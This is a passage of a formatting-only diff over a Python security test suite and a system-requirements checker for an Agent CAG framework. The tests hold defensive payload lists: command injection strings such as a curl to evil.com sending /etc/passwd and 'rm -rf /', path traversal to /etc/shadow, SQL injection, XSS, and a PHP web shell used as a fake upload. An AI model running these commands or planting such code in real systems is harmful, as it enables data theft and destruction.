\"javascript:\" not in response_text\n                 assert \"onerror=\" not in response_text\n-    \n+\n     def test_command_injection_protection(self):\n         \"\"\"Test protection against command injection.\"\"\"\n         command_injection_payloads = [\n             \"; ls -la\",\n             \"| cat /etc/passwd\",\n             \"&& rm -rf /\",\n             \"`whoami`\",\n             \"$(cat /etc/hosts)\",\n-            \"; curl http://evil.com/steal?data=$(cat /etc/passwd)\"\n-        ]\n-        \n+            \"; curl http://evil.com/steal?data=$(cat /etc/passwd)\",\n+        ]\n+\n         for payload in command_injection_payloads:\n             response = self.client.post(\n                 \"/query\",\n-                json={\n-                    \"text\": payload,\n-                    \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n+                json={\"text\": payload, \"user_id\": \"test_user\", \"input_type\": \"text\"},\n             )\n-            \n+\n             # Should not execute system commands\n             assert response.status_code in [200, 400, 422]\n-    \n+\n     def test_path_traversal_protection(self):\n         \"\"\"Test protection against path traversal attacks.\"\"\"\n         path_traversal_payloads = [\n             \"../../../etc/passwd\",\n             \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n             \"/etc/shadow\",\n             \"....//....//....//etc/passwd\",\n-            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"\n-        ]\n-        \n+            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n+        ]\n+\n         for payload in path_traversal_payloads:\n             # Test file serving endpoints if they exist\n             response = self.client.get(f\"/files/{payload}\")\n             # Should return 404 or 403, not file contents\n             assert response.status_code in [404, 403, 422]\n-    \n+\n     def test_large_payload_protection(self):\n         \"\"\"Test protection against large payload attacks.\"\"\"\n         # Test extremely large text input\n         large_text = \"A\" * (10 * 1024 * 1024)  # 10MB\n-        \n+\n         response = self.client.post(\n             \"/query\",\n-            json={\n-                \"text\": large_text,\n-                \"user_id\": \"test_user\",\n-                \"input_type\": \"text\"\n-            }\n+            json={\"text\": large_text, \"user_id\": \"test_user\", \"input_type\": \"text\"},\n         )\n-        \n+\n         # Should reject or handle gracefully\n         assert response.status_code in [400, 413, 422]\n-    \n+\n     def test_malformed_json_protection(self):\n         \"\"\"Test protection against malformed JSON.\"\"\"\n         malformed_payloads = [\n             '{\"text\": \"test\", \"user_id\": \"test\", \"input_type\": \"text\",}',  # Trailing comma\n             '{\"text\": \"test\", \"user_id\": \"test\", \"input_type\": \"text\"',  # Missing closing brace\n             '{\"text\": \"test\", \"user_id\": \"test\", \"input_type\": \"text\", \"extra\": }',  # Invalid value\n             '{text: \"test\", user_id: \"test\", input_type: \"text\"}',  # Unquoted keys\n         ]\n-        \n+\n         for payload in malformed_payloads:\n             response = self.client.post(\n-                \"/query\",\n-                data=payload,\n-                headers={\"Content-Type\": \"application/json\"}\n+                \"/query\", data=payload, headers={\"Content-Type\": \"application/json\"}\n             )\n-            \n+\n             # Should return 422 for malformed JSON\n             assert response.status_code == 422\n \n \n class TestAuthenticationSecurity:\n     \"\"\"Test authentication and authorization security.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_user_id_validation(self):\n         \"\"\"Test user ID validation and sanitization.\"\"\"\n         invalid_user_ids = [\n             \"\",  # Empty\n             None,  # Null\n             \"a\" * 1000,  # Too long\n             \"../admin\",  # Path traversal\n             \"admin'; DROP TABLE users; --\",  # SQL injection\n             \"<script>alert('xss')</script>\",  # XSS\n         ]\n-        \n+\n         for user_id in invalid_user_ids:\n             response = self.client.post(\n                 \"/query\",\n-                json={\n-                    \"text\": \"test query\",\n-                    \"user_id\": user_id,\n-                    \"input_type\": \"text\"\n-                }\n+                json={\"text\": \"test query\", \"user_id\": user_id, \"input_type\": \"text\"},\n             )\n-            \n+\n             # Should validate user_id properly\n             if user_id is None or user_id == \"\":\n                 assert response.status_code == 422\n-    \n+\n     def test_session_security(self):\n         \"\"\"Test session management security.\"\"\"\n         # Test for session fixation vulnerabilities\n         response1 = self.client.get(\"/health\")\n         session1 = response1.cookies.get(\"session\")\n-        \n+\n         response2 = self.client.get(\"/health\")\n         session2 = response2.cookies.get(\"session\")\n-        \n+\n         # Sessions should be properly managed\n         # (This test depends on actual session implementation)\n         assert response1.status_code == 200\n         assert response2.status_code == 200\n-    \n+\n     def test_rate_limiting_bypass_attempts(self):\n         \"\"\"Test attempts to bypass rate limiting.\"\"\"\n         # Simulate rapid requests from same IP\n         responses = []\n         for i in range(100):\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"test query {i}\",\n                     \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n+                    \"input_type\": \"text\",\n+                },\n             )\n             responses.append(response)\n-        \n+\n         # Should implement some form of rate limiting\n         # (This test depends on actual rate limiting implementation)\n         status_codes = [r.status_code for r in responses]\n         # At least some requests should be rate limited if implemented\n         assert all(code in [200, 429, 400, 422] for code in status_codes)\n \n \n class TestDataSecurity:\n     \"\"\"Test data security and privacy.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_sensitive_data_exposure(self):\n         \"\"\"Test for sensitive data exposure in responses.\"\"\"\n         response = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"What is my password?\",\n                 \"user_id\": \"test_user\",\n-                \"input_type\": \"text\"\n-            }\n+                \"input_type\": \"text\",\n+            },\n         )\n-        \n+\n         if response.status_code == 200:\n             response_text = response.text.lower()\n-            \n+\n             # Should not expose sensitive information\n             sensitive_patterns = [\n                 \"password\",\n                 \"secret\",\n                 \"api_key\",\n                 \"token\",\n                 \"private_key\",\n                 \"database_url\",\n-                \"connection_string\"\n+                \"connection_string\",\n             ]\n-            \n+\n             # Check that sensitive patterns are not exposed\n             for pattern in sensitive_patterns:\n                 assert pattern not in response_text or \"***\" in response_text\n-    \n+\n     def test_user_data_isolation(self):\n         \"\"\"Test that users cannot access other users' data.\"\"\"\n         # Create data for user1\n         response1 = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"My secret information\",\n                 \"user_id\": \"user1\",\n-                \"input_type\": \"text\"\n-            }\n+                \"input_type\": \"text\",\n+            },\n         )\n-        \n+\n         # Try to access user1's data as user2\n         response2 = self.client.get(\"/history/user1\")\n-        \n+\n         # Should not allow cross-user data access\n         # (This test depends on actual authorization implementation)\n         assert response2.status_code in [200, 403, 404]\n-    \n+\n     def test_data_sanitization(self):\n         \"\"\"Test that stored data is properly sanitized.\"\"\"\n         malicious_data = {\n             \"text\": \"<script>alert('stored xss')</script>\",\n             \"user_id\": \"test_user\",\n-            \"input_type\": \"text\"\n+            \"input_type\": \"text\",\n         }\n-        \n+\n         # Store malicious data\n         response1 = self.client.post(\"/query\", json=malicious_data)\n-        \n+\n         # Retrieve data\n         response2 = self.client.get(\"/history/test_user\")\n-        \n+\n         if response2.status_code == 200:\n             # Data should be sanitized when retrieved\n             response_text = response2.text.lower()\n             assert \"<script>\" not in response_text\n \n \n class TestFileUploadSecurity:\n     \"\"\"Test file upload security for ASR service.\"\"\"\n-    \n+\n     def test_malicious_file_upload(self):\n         \"\"\"Test protection against malicious file uploads.\"\"\"\n         # Create a fake malicious file\n         malicious_content = b\"<?php system($_GET['cmd']); ?>\"\n-        \n+\n         with tempfile.NamedTemporaryFile(suffix=\".wav\", delete=False) as temp_file:\n             temp_file.write(malicious_content)\n             temp_file.flush()\n-            \n+\n             try:\n                 with open(temp_file.name, \"rb\") as f:\n                     # Mock ASR service client\n-                    with patch('httpx.AsyncClient') as mock_client:\n+                    with patch(\"httpx.AsyncClient\") as mock_client:\n                         mock_response = MagicMock()\n                         mock_response.status_code = 400\n-                        mock_response.json.return_value = {\"error\": \"Invalid audio file\"}\n-                        mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)\n-                        \n+                        mock_response.json.return_value = {\n+                            \"error\": \"Invalid audio file\"\n+                        }\n+                        mock_client.return_value.__aenter__.return_value.post = (\n+                            AsyncMock(return_value=mock_response)\n+                        )\n+\n                         client = TestClient(app)\n                         response = client.post(\n                             \"/query\",\n                             files={\"audio\": (\"malicious.wav\", f, \"audio/wav\")},\n-                            data={\"user_id\": \"test_user\"}\n+                            data={\"user_id\": \"test_user\"},\n                         )\n-                        \n+\n                         # Should reject malicious files\n                         assert response.status_code in [400, 422]\n             finally:\n                 os.unlink(temp_file.name)\n-    \n+\n     def test_file_type_validation(self):\n         \"\"\"Test file type validation.\"\"\"\n         invalid_files = [\n             (\"test.exe\", b\"MZ\\x90\\x00\", \"application/octet-stream\"),\n             (\"test.php\", b\"<?php echo 'hello'; ?>\", \"text/plain\"),\n             (\"test.js\", b\"alert('xss')\", \"application/javascript\"),\n-            (\"test.html\", b\"<script>alert('xss')</script>\", \"text/html\")\n-        ]\n-        \n+            (\"test.html\", b\"<script>alert('xss')</script>\", \"text/html\"),\n+        ]\n+\n         for filename, content, content_type in invalid_files:\n             with tempfile.NamedTemporaryFile(delete=False) as temp_file:\n                 temp_file.write(content)\n                 temp_file.flush()\n-                \n+\n                 try:\n                     with open(temp_file.name, \"rb\") as f:\n-                        with patch('httpx.AsyncClient') as mock_client:\n+                        with patch(\"httpx.AsyncClient\") as mock_client:\n                             mock_response = MagicMock()\n                             mock_response.status_code = 400\n-                            mock_response.json.return_value = {\"error\": \"Invalid file type\"}\n-                            mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)\n-                            \n+                            mock_response.json.return_value = {\n+                                \"error\": \"Invalid file type\"\n+                            }\n+                            mock_client.return_value.__aenter__.return_value.post = (\n+                                AsyncMock(return_value=mock_response)\n+                            )\n+\n                             client = TestClient(app)\n                             response = client.post(\n                                 \"/query\",\n                                 files={\"audio\": (filename, f, content_type)},\n-                                data={\"user_id\": \"test_user\"}\n+                                data={\"user_id\": \"test_user\"},\n                             )\n-                            \n+\n                             # Should reject invalid file types\n                             assert response.status_code in [400, 422]\n                 finally:\n                     os.unlink(temp_file.name)\n \n \n class TestSecurityHeaders:\n     \"\"\"Test security headers and configurations.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_security_headers_present(self):\n         \"\"\"Test that security headers are present.\"\"\"\n         response = self.client.get(\"/health\")\n-        \n+\n         # Check for important security headers\n         headers = response.headers\n-        \n+\n         # These headers should be present for security\n         expected_headers = [\n             \"x-content-type-options\",\n             \"x-frame-options\",\n             \"x-xss-protection\",\n         ]\n-        \n+\n         # Note: Not all headers may be implemented yet\n         # This test documents what should be implemented\n         for header in expected_headers:\n             if header in headers:\n                 assert headers[header] is not None\n-    \n+\n     def test_cors_configuration(self):\n         \"\"\"Test CORS configuration security.\"\"\"\n         # Test preflight request\n         response = self.client.options(\n             \"/query\",\n             headers={\n                 \"Origin\": \"http://evil.com\",\n                 \"Access-Control-Request-Method\": \"POST\",\n-                \"Access-Control-Request-Headers\": \"Content-Type\"\n-            }\n+                \"Access-Control-Request-Headers\": \"Content-Type\",\n+            },\n         )\n-        \n+\n         # Should have proper CORS configuration\n         if \"access-control-allow-origin\" in response.headers:\n             origin = response.headers[\"access-control-allow-origin\"]\n             # Should not allow all origins in production\n             assert origin != \"*\" or True  # Allow for development\n-    \n+\n     def test_information_disclosure(self):\n         \"\"\"Test for information disclosure in error messages.\"\"\"\n         # Test with invalid endpoint\n         response = self.client.get(\"/nonexistent\")\n-        \n+\n         # Should not expose internal information\n         if response.status_code == 404:\n             response_text = response.text.lower()\n-            \n+\n             # Should not expose sensitive paths or internal details\n             sensitive_info = [\n                 \"/home/\",\n                 \"traceback\",\n                 \"exception\",\n                 \"database\",\n                 \"connection\",\n-                \"password\"\n+                \"password\",\n             ]\n-            \n+\n             for info in sensitive_info:\n                 assert info not in response_text or \"***\" in response_text\n \n \n class TestDependencyVulnerabilities:\n     \"\"\"Test for known dependency vulnerabilities.\"\"\"\n-    \n+\n     def test_requirements_security_scan(self):\n         \"\"\"Test that requirements don't contain known vulnerabilities.\"\"\"\n         # This would typically use tools like safety or pip-audit\n         # For now, we'll check that requirements files exist\n-        \n+\n         requirements_files = [\n             \"api/requirements.txt\",\n-            \"asr/requirements.txt\", \n+            \"asr/requirements.txt\",\n             \"llm/requirements.txt\",\n-            \"tts/requirements.txt\"\n-        ]\n-        \n+            \"tts/requirements.txt\",\n+        ]\n+\n         for req_file in requirements_files:\n-            assert os.path.exists(req_file), f\"Requirements file {req_file} should exist\"\n-            \n+            assert os.path.exists(\n+                req_file\n+            ), f\"Requirements file {req_file} should exist\"\n+\n             # Read requirements and check for obviously vulnerable packages\n-            with open(req_file, 'r') as f:\n+            with open(req_file, \"r\") as f:\n                 content = f.read().lower()\n-                \n+\n                 # Check for packages with known vulnerabilities\n                 # (This is a basic check - use proper security scanning tools)\n                 vulnerable_patterns = [\n                     \"django==1.11\",  # Old Django versions\n-                    \"flask==0.12\",   # Old Flask versions\n-                    \"requests==2.6\", # Old requests versions\n+                    \"flask==0.12\",  # Old Flask versions\n+                    \"requests==2.6\",  # Old requests versions\n                 ]\n-                \n+\n                 for pattern in vulnerable_patterns:\n-                    assert pattern not in content, f\"Potentially vulnerable package found: {pattern}\"\n+                    assert (\n+                        pattern not in content\n+                    ), f\"Potentially vulnerable package found: {pattern}\"\n \n \n class TestConfigurationSecurity:\n     \"\"\"Test configuration security.\"\"\"\n-    \n+\n     def test_debug_mode_disabled(self):\n         \"\"\"Test that debug mode is disabled in production.\"\"\"\n         # Check that debug information is not exposed\n         response = TestClient(app).get(\"/nonexistent\")\n-        \n+\n         if response.status_code == 404:\n             # Should not contain debug information\n             response_text = response.text.lower()\n-            debug_indicators = [\n-                \"traceback\",\n-                \"debug\",\n-                \"development\",\n-                \"stack trace\"\n-            ]\n-            \n+            debug_indicators = [\"traceback\", \"debug\", \"development\", \"stack trace\"]\n+\n             for indicator in debug_indicators:\n                 assert indicator not in response_text or \"production\" in response_text\n-    \n+\n     def test_environment_variable_security(self):\n         \"\"\"Test that sensitive environment variables are not exposed.\"\"\"\n         # This test checks that the application doesn't accidentally expose env vars\n         response = TestClient(app).get(\"/health\")\n-        \n+\n         if response.status_code == 200:\n             response_text = response.text.lower()\n-            \n+\n             # Should not expose environment variables\n             sensitive_env_patterns = [\n                 \"password\",\n                 \"secret\",\n                 \"key\",\n                 \"token\",\n-                \"database_url\"\n+                \"database_url\",\n             ]\n-            \n+\n             for pattern in sensitive_env_patterns:\n                 # If pattern is found, it should be masked\n                 if pattern in response_text:\n                     assert \"***\" in response_text or \"[REDACTED]\" in response_text\n \n \n class TestSecurityMonitoring:\n     \"\"\"Test security monitoring and logging.\"\"\"\n-    \n+\n     def test_security_event_logging(self):\n         \"\"\"Test that security events are logged.\"\"\"\n         # This test would verify that security events are properly logged\n         # For now, we'll test that the application handles security events gracefully\n-        \n+\n         client = TestClient(app)\n-        \n+\n         # Generate various security events\n         security_events = [\n             # SQL injection attempt\n-            {\"text\": \"'; DROP TABLE users; --\", \"user_id\": \"attacker\", \"input_type\": \"text\"},\n+            {\n+                \"text\": \"'; DROP TABLE users; --\",\n+                \"user_id\": \"attacker\",\n+                \"input_type\": \"text\",\n+            },\n             # XSS attempt\n-            {\"text\": \"<script>alert('xss')</script>\", \"user_id\": \"attacker\", \"input_type\": \"text\"},\n+            {\n+                \"text\": \"<script>alert('xss')</script>\",\n+                \"user_id\": \"attacker\",\n+                \"input_type\": \"text\",\n+            },\n             # Large payload\n             {\"text\": \"A\" * 10000, \"user_id\": \"attacker\", \"input_type\": \"text\"},\n         ]\n-        \n+\n         for event in security_events:\n             response = client.post(\"/query\", json=event)\n             # Should handle security events gracefully\n             assert response.status_code in [200, 400, 422, 429]\n-    \n+\n     def test_failed_request_handling(self):\n         \"\"\"Test handling of failed requests.\"\"\"\n         client = TestClient(app)\n-        \n+\n         # Generate multiple failed requests\n         for i in range(10):\n-            response = client.post(\n-                \"/query\",\n-                json={\"invalid\": \"data\"}\n-            )\n-            \n+            response = client.post(\"/query\", json={\"invalid\": \"data\"})\n+\n             # Should handle failed requests consistently\n-            assert response.status_code in [400, 422]\n\\ No newline at end of file\n+            assert response.status_code in [400, 422]\n--- /home/pas/source/agent-cag/check_system.py\t2025-06-20 17:04:00.309905+00:00\n+++ /home/pas/source/agent-cag/check_system.py\t2025-06-20 19:24:34.632139+00:00\n@@ -17,514 +17,618 @@\n import psutil\n \n \n class SystemChecker:\n     \"\"\"System requirements checker for Agent CAG framework.\"\"\"\n-    \n+\n     def __init__(self):\n         self.results = {\n-            'system_info': {},\n-            'requirements': {},\n-            'recommendations': [],\n-            'warnings': [],\n-            'errors': [],\n-            'deployment_profiles': {}\n+            \"system_info\": {},\n+            \"requirements\": {},\n+            \"recommendations\": [],\n+            \"warnings\": [],\n+            \"errors\": [],\n+            \"deployment_profiles\": {},\n         }\n-        \n+\n         # Define minimum requirements for different profiles\n         self.profiles = {\n-            'lightweight': {\n-                'name': 'Lightweight Profile',\n-                'description': 'DuckDB + Containerized Ollama',\n-                'min_ram_gb': 8,\n-                'recommended_ram_gb': 16,\n-                'min_disk_gb': 20,\n-                'recommended_disk_gb': 50,\n-                'min_cpu_cores': 4,\n-                'gpu_required': False,\n-                'gpu_recommended': True,\n-                'services': ['api', 'asr', 'llm', 'tts', 'sardaukar-translator', 'ollama']\n+            \"lightweight\": {\n+                \"name\": \"Lightweight Profile\",\n+                \"description\": \"DuckDB + Containerized Ollama\",\n+                \"min_ram_gb\": 8,\n+                \"recommended_ram_gb\": 16,\n+                \"min_disk_gb\": 20,\n+                \"recommended_disk_gb\": 50,\n+                \"min_cpu_cores\": 4,\n+                \"gpu_required\": False,\n+                \"gpu_recommended\": True,\n+                \"services\": [\n+                    \"api\",\n+                    \"asr\",\n+                    \"llm\",\n+                    \"tts\",\n+                    \"sardaukar-translator\",\n+                    \"ollama\",\n+                ],\n             },\n-            'full': {\n-                'name': 'Full Profile',\n-                'description': 'ChromaDB + Neo4j + Containerized Ollama',\n-                'min_ram_gb': 16,\n-                'recommended_ram_gb': 32,\n-                'min_disk_gb': 40,\n-                'recommended_disk_gb': 100,\n-                'min_cpu_cores': 6,\n-                'gpu_required': False,\n-                'gpu_recommended': True,\n-                'services': ['api', 'asr', 'llm', 'tts', 'sardaukar-translator', 'ollama', 'chromadb', 'neo4j']\n+            \"full\": {\n+                \"name\": \"Full Profile\",\n+                \"description\": \"ChromaDB + Neo4j + Containerized Ollama\",\n+                \"min_ram_gb\": 16,\n+                \"recommended_ram_gb\": 32,\n+                \"min_disk_gb\": 40,\n+                \"recommended_disk_gb\": 100,\n+                \"min_cpu_cores\": 6,\n+                \"gpu_required\": False,\n+                \"gpu_recommended\": True,\n+                \"services\": [\n+                    \"api\",\n+                    \"asr\",\n+                    \"llm\",\n+                    \"tts\",\n+                    \"sardaukar-translator\",\n+                    \"ollama\",\n+                    \"chromadb\",\n+                    \"neo4j\",\n+                ],\n             },\n-            'monitoring': {\n-                'name': 'Monitoring Profile',\n-                'description': 'Adds Prometheus + Grafana',\n-                'additional_ram_gb': 2,\n-                'additional_disk_gb': 10,\n-                'additional_services': ['prometheus', 'grafana']\n+            \"monitoring\": {\n+                \"name\": \"Monitoring Profile\",\n+                \"description\": \"Adds Prometheus + Grafana\",\n+                \"additional_ram_gb\": 2,\n+                \"additional_disk_gb\": 10,\n+                \"additional_services\": [\"prometheus\", \"grafana\"],\n             },\n-            'local_ollama': {\n-                'name': 'Local Ollama Mode',\n-                'description': 'Uses host-installed Ollama',\n-                'ram_savings_gb': 4,\n-                'disk_savings_gb': 10,\n-                'requires_host_ollama': True\n-            }\n+            \"local_ollama\": {\n+                \"name\": \"Local Ollama Mode\",\n+                \"description\": \"Uses host-installed Ollama\",\n+                \"ram_savings_gb\": 4,\n+                \"disk_savings_gb\": 10,\n+                \"requires_host_ollama\": True,\n+            },\n         }\n \n     def check_system_info(self):\n         \"\"\"Gather basic system information.\"\"\"\n         try:\n-            self.results['system_info'] = {\n-                'platform': platform.platform(),\n-                'system': platform.system(),\n-                'machine': platform.machine(),\n-                'processor': platform.processor(),\n-                'python_version': platform.python_version(),\n-                'cpu_count': psutil.cpu_count(logical=False),\n-                'cpu_count_logical': psutil.cpu_count(logical=True),\n-                'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),\n-                'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),\n-                'disk_total_gb': round(psutil.disk_usage('/').total / (1024**3), 2),\n-                'disk_free_gb': round(psutil.disk_usage('/').free / (1024**3), 2),\n+            self.results[\"system_info\"] = {\n+                \"platform\": platform.platform(),\n+                \"system\": platform.system(),\n+                \"machine\": platform.machine(),\n+                \"processor\": platform.processor(),\n+                \"python_version\": platform.python_version(),\n+                \"cpu_count\": psutil.cpu_count(logical=False),\n+                \"cpu_count_logical\": psutil.cpu_count(logical=True),\n+                \"memory_total_gb\": round(psutil.virtual_memory().total / (1024**3), 2),\n+                \"memory_available_gb\": round(\n+                    psutil.virtual_memory().available / (1024**3), 2\n+                ),\n+                \"disk_total_gb\": round(psutil.disk_usage(\"/\").total / (1024**3), 2),\n+                \"disk_free_gb\": round(psutil.disk_usage(\"/\").free / (1024**3), 2),\n             }\n         except Exception as e:\n-            self.results['errors'].append(f\"Failed to gather system info: {e}\")\n+            self.results[\"errors\"].append(f\"Failed to gather system info: {e}\")\n \n     def check_docker(self):\n         \"\"\"Check Docker installation and configuration.\"\"\"\n         docker_info = {\n-            'installed': False,\n-            'version': None,\n-            'compose_installed': False,\n-            'compose_version': None,\n-            'daemon_running': False,\n-            'user_in_group': False,\n-            'gpu_support': False\n+            \"installed\": False,\n+            \"version\": None,\n+            \"compose_installed\": False,\n+            \"compose_version\": None,\n+            \"daemon_running\": False,\n+            \"user_in_group\": False,\n+            \"gpu_support\": False,\n         }\n-        \n+\n         try:\n             # Check Docker installation\n-            result = subprocess.run(['docker', '--version'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                docker_info['installed'] = True\n-                docker_info['version'] = result.stdout.strip()\n-            \n+            result = subprocess.run(\n+                [\"docker\", \"--version\"], capture_output=True, text=True, timeout=10\n+            )\n+            if result.returncode == 0:\n+                docker_info[\"installed\"] = True\n+                docker_info[\"version\"] = result.stdout.strip()\n+\n             # Check Docker daemon\n-            result = subprocess.run(['docker', 'info'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                docker_info['daemon_running'] = True\n-            \n+            result = subprocess.run(\n+                [\"docker\", \"info\"], capture_output=True, text=True, timeout=10\n+            )\n+            if result.returncode == 0:\n+                docker_info[\"daemon_running\"] = True\n+\n             # Check Docker Compose\n-            result = subprocess.run(['docker-compose', '--version'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                docker_info['compose_installed'] = True\n-                docker_info['compose_version'] = result.stdout.strip()\n-            \n+            result = subprocess.run(\n+                [\"docker-compose\", \"--version\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=10,\n+            )\n+            if result.returncode == 0:\n+                docker_info[\"compose_installed\"] = True\n+                docker_info[\"compose_version\"] = result.stdout.strip()\n+\n             # Check user in docker group\n             try:\n                 import grp\n-                docker_group = grp.getgrnam('docker')\n-                current_user = os.getenv('USER')\n+\n+                docker_group = grp.getgrnam(\"docker\")\n+                current_user = os.getenv(\"USER\")\n                 if current_user in docker_group.gr_mem:\n-                    docker_info['user_in_group'] = True\n+                    docker_info[\"user_in_group\"] = True\n             except KeyError:\n                 pass\n-            \n+\n             # Check GPU support (NVIDIA Container Toolkit)\n-            result = subprocess.run(['docker', 'run', '--rm', '--gpus', 'all', \n-                                   'nvidia/cuda:11.0-base', 'nvidia-smi'], \n-                                  capture_output=True, text=True, timeout=30)\n-            if result.returncode == 0:\n-                docker_info['gpu_support'] = True\n-                \n+            result = subprocess.run(\n+                [\n+                    \"docker\",\n+                    \"run\",\n+                    \"--rm\",\n+                    \"--gpus\",\n+                    \"all\",\n+                    \"nvidia/cuda:11.0-base\",\n+                    \"nvidia-smi\",\n+                ],\n+                capture_output=True,\n+                text=True,\n+                timeout=30,\n+            )\n+            if result.returncode == 0:\n+                docker_info[\"gpu_support\"] = True\n+\n         except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:\n-            self.results['warnings'].append(f\"Docker check failed: {e}\")\n-        \n-        self.results['requirements']['docker'] = docker_info\n+            self.results[\"warnings\"].append(f\"Docker check failed: {e}\")\n+\n+        self.results[\"requirements\"][\"docker\"] = docker_info\n \n     def check_ollama(self):\n         \"\"\"Check if Ollama is installed locally.\"\"\"\n         ollama_info = {\n-            'installed': False,\n-            'version': None,\n-            'running': False,\n-            'models': []\n+            \"installed\": False,\n+            \"version\": None,\n+            \"running\": False,\n+            \"models\": [],\n         }\n-        \n+\n         try:\n             # Check Ollama installation\n-            result = subprocess.run(['ollama', '--version'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                ollama_info['installed'] = True\n-                ollama_info['version'] = result.stdout.strip()\n-            \n+            result = subprocess.run(\n+                [\"ollama\", \"--version\"], capture_output=True, text=True, timeout=10\n+            )\n+            if result.returncode == 0:\n+                ollama_info[\"installed\"] = True\n+                ollama_info[\"version\"] = result.stdout.strip()\n+\n             # Check if Ollama is running\n-            result = subprocess.run(['curl', '-s', 'http://localhost:11434/api/tags'], \n-                                  capture_output=True, text=True, timeout=5)\n-            if result.returncode == 0:\n-                ollama_info['running'] = True\n+            result = subprocess.run(\n+                [\"curl\", \"-s\", \"http://localhost:11434/api/tags\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=5,\n+            )\n+            if result.returncode == 0:\n+                ollama_info[\"running\"] = True\n                 try:\n                     models_data = json.loads(result.stdout)\n-                    ollama_info['models'] = [model['name'] for model in models_data.get('models', [])]\n+                    ollama_info[\"models\"] = [\n+                        model[\"name\"] for model in models_data.get(\"models\", [])\n+                    ]\n                 except json.JSONDecodeError:\n                     pass\n-                    \n+\n         except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:\n             pass  # Ollama not required for containerized mode\n-        \n-        self.results['requirements']['ollama'] = ollama_info\n+\n+        self.results[\"requirements\"][\"ollama\"] = ollama_info\n \n     def check_gpu(self):\n         \"\"\"Check GPU availability and capabilities.\"\"\"\n         gpu_info = {\n-            'nvidia_gpu': False,\n-            'nvidia_driver': None,\n-            'cuda_version': None,\n-            'gpu_memory_gb': 0,\n-            'gpu_count': 0\n+            \"nvidia_gpu\": False,\n+            \"nvidia_driver\": None,\n+            \"cuda_version\": None,\n+            \"gpu_memory_gb\": 0,\n+            \"gpu_count\": 0,\n         }\n-        \n+\n         try:\n             # Check NVIDIA GPU\n-            result = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total', \n-                                   '--format=csv,noheader,nounits'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                gpu_info['nvidia_gpu'] = True\n-                lines = result.stdout.strip().split('\\n')\n-                gpu_info['gpu_count'] = len(lines)\n-                \n+            result = subprocess.run(\n+                [\n+                    \"nvidia-smi\",\n+                    \"--query-gpu=name,memory.total\",\n+                    \"--format=csv,noheader,nounits\",\n+                ],\n+                capture_output=True,\n+                text=True,\n+                timeout=10,\n+            )\n+            if result.returncode == 0:\n+                gpu_info[\"nvidia_gpu\"] = True\n+                lines = result.stdout.strip().split(\"\\n\")\n+                gpu_info[\"gpu_count\"] = len(lines)\n+\n                 total_memory = 0\n                 for line in lines:\n-                    if ',' in line:\n-                        _, memory = line.split(',')\n+                    if \",\" in line:\n+                        _, memory = line.split(\",\")\n                         total_memory += int(memory.strip())\n-                gpu_info['gpu_memory_gb'] = round(total_memory / 1024, 2)\n-            \n+                gpu_info[\"gpu_memory_gb\"] = round(total_memory / 1024, 2)\n+\n             # Check NVIDIA driver version\n-            result = subprocess.run(['nvidia-smi', '--query-gpu=driver_version', \n-                                   '--format=csv,noheader'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                gpu_info['nvidia_driver'] = result.stdout.strip()\n-            \n+            result = subprocess.run(\n+                [\"nvidia-smi\", \"--query-gpu=driver_version\", \"--format=csv,noheader\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=10,\n+            )\n+            if result.returncode == 0:\n+                gpu_info[\"nvidia_driver\"] = result.stdout.strip()\n+\n             # Check CUDA version\n-            result = subprocess.run(['nvcc', '--version'], \n-                                  capture_output=True, text=True, timeout=10)\n-            if result.returncode == 0:\n-                for line in result.stdout.split('\\n'):\n-                    if 'release' in line.lower():\n-                        gpu_info['cuda_version'] = line.strip()\n+            result = subprocess.run(\n+                [\"nvcc\", \"--version\"], capture_output=True, text=True, timeout=10\n+            )\n+            if result.returncode == 0:\n+                for line in result.stdout.split(\"\\n\"):\n+                    if \"release\" in line.lower():\n+                        gpu_info[\"cuda_version\"] = line.strip()\n                         break\n-                        \n+\n         except (subprocess.TimeoutExpired, FileNotFoundError, Exception):\n             pass  # GPU not required but recommended\n-        \n-        self.results['requirements']['gpu'] = gpu_info\n+\n+        self.results[\"requirements\"][\"gpu\"] = gpu_info\n \n     def analyze_profiles(self):\n         \"\"\"Analyze which deployment profiles are suitable for this system.\"\"\"\n-        system_ram = self.results['system_info']['memory_total_gb']\n-        system_disk = self.results['system_info']['disk_free_gb']\n-        system_cpu = self.results['system_info']['cpu_count']\n-        \n+        system_ram = self.results[\"system_info\"][\"memory_total_gb\"]\n+        system_disk = self.results[\"system_info\"][\"disk_free_gb\"]\n+        system_cpu = self.results[\"system_info\"][\"cpu_count\"]\n+\n         for profile_name, profile in self.profiles.items():\n-            if profile_name == 'monitoring':\n+            if profile_name == 